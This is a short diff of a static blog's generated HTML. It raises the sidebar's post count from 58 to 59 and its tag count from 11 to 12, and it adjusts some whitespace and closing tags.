-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2294,7 +2283,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">58</span>
+                    <span class="site-state-item-count">59</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2372,7 +2361,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">11</span>
+                      
+                    
+                    <span class="site-state-item-count">12</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
